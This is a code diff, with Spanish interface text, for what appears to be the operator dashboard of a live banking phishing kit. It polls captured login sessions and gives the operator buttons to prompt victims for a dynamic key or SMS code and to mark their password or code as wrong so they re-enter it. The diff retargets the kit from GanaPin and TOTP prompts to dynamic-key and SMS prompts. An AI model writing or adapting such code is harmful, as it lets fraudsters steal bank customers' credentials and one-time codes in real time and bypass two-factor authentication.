@@ -16,13 +16,12 @@ function statusLabel(state) {
   if (state === 'waiting') return 'En espera'
   if (state === 'active') return 'Activo'
   if (state === 'done') return 'Listo'
-  if (state === 'error-pass') return 'Error clave'
-  if (state === 'error-user') return 'Error user'
+  if (state === 'error-login') return 'Error de datos'
   if (state === 'error') return 'Error'
-  if (state === 'waiting-token') return 'Esperando Token'
-  if (state === 'waiting-ganapin') return 'GanaPin enviado'
-  if (state === 'waiting-totp') return 'Auth enviado'
-  if (state === 'error-token') return 'Error Token'
+  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
+  if (state === 'waiting-sms') return 'SMS solicitado'
+  if (state === 'error-dinamica') return 'Error Dinámica'
+  if (state === 'error-sms') return 'Error SMS'
   if (state === 'typing') return 'Escribiendo código'
   return 'Nuevo'
 }
@@ -30,9 +29,8 @@ function statusLabel(state) {
 function badgeClass(state) {
   if (
     state === 'waiting' ||
-    state === 'waiting-token' ||
-    state === 'waiting-ganapin' ||
-    state === 'waiting-totp' ||
+    state === 'waiting-dinamica' ||
+    state === 'waiting-sms' ||
     state === 'typing'
   ) {
     return 'badge badge--wait'
@@ -40,10 +38,10 @@ function badgeClass(state) {
   if (state === 'active') return 'badge badge--hola'
   if (state === 'done') return 'badge badge--done'
   if (
-    state === 'error-pass' ||
-    state === 'error-user' ||
-    state === 'error' ||
-    state === 'error-token'
+    state === 'error-login' ||
+    state === 'error-dinamica' ||
+    state === 'error-sms' ||
+    state === 'error'
   ) {
     return 'badge badge--error'
   }
@@ -133,30 +131,30 @@ function createRow(row) {
     <td class="col-status"></td>
     <td>
       <div class="row-actions">
-        <button type="button" class="btn btn--ok" data-action="ganapin">GanaPin</button>
-        <button type="button" class="btn btn--ok" data-action="totp">Autenticador</button>
-        <button type="button" class="btn btn--error" data-action="error-pass">Err clave</button>
-        <button type="button" class="btn btn--error" data-action="error-user">Err user</button>
-        <button type="button" class="btn btn--error" data-action="error-token">Err Token</button>
+        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
+        <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
+        <button type="button" class="btn btn--error" data-action="error-login">Err Clave</button>
+        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
+        <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
         <button type="button" class="btn btn--done" data-action="done">Listo</button>
       </div>
     </td>
   `
 
-  tr.querySelector('[data-action="ganapin"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'waiting-ganapin', 'ganapin')
+  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'waiting-dinamica', 'dinamica')
   })
-  tr.querySelector('[data-action="totp"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'waiting-totp', 'totp')
+  tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'waiting-sms', 'sms')
   })
-  tr.querySelector('[data-action="error-pass"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'error-pass', 'error-pass')
+  tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-login', 'error-login')
   })
-  tr.querySelector('[data-action="error-user"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'error-user', 'error-user')
+  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-dinamica', 'error-dinamica')
   })
-  tr.querySelector('[data-action="error-token"]')?.addEventListener('click', () => {
-    setRowState(row.id, 'error-token', 'error-token')
+  tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-sms', 'error-sms')
   })
   tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
     setRowState(row.id, 'done', 'done')
@@ -195,10 +193,10 @@ function updateRow(tr, row) {
   tr.querySelector('.col-status').innerHTML =
     `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`
 
-  const ganapinBtn = tr.querySelector('[data-action="ganapin"]')
-  const totpBtn = tr.querySelector('[data-action="totp"]')
-  ganapinBtn?.classList.toggle('is-on', row.state === 'waiting-ganapin')
-  totpBtn?.classList.toggle('is-on', row.state === 'waiting-totp')
+  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
+  const smsBtn = tr.querySelector('[data-action="sms"]')
+  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
+  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
   tr.classList.toggle('is-waiting', row.state === 'waiting')
 }
 
@@ -300,6 +298,6 @@ window.setInterval(pollSessions, 2000)
 // Initial load
 pollSessions().then(() => {
   hint.textContent = rows.size
-    ? `En cola: ${rows.size}. Elige GanaPin o Autenticador en Acciones.`
+    ? `En cola: ${rows.size}. Elige Dinámica o SMS en Acciones.`
     : 'Esperando usuarios del login… Al Verificar llegan aquí ordenados.'
 });
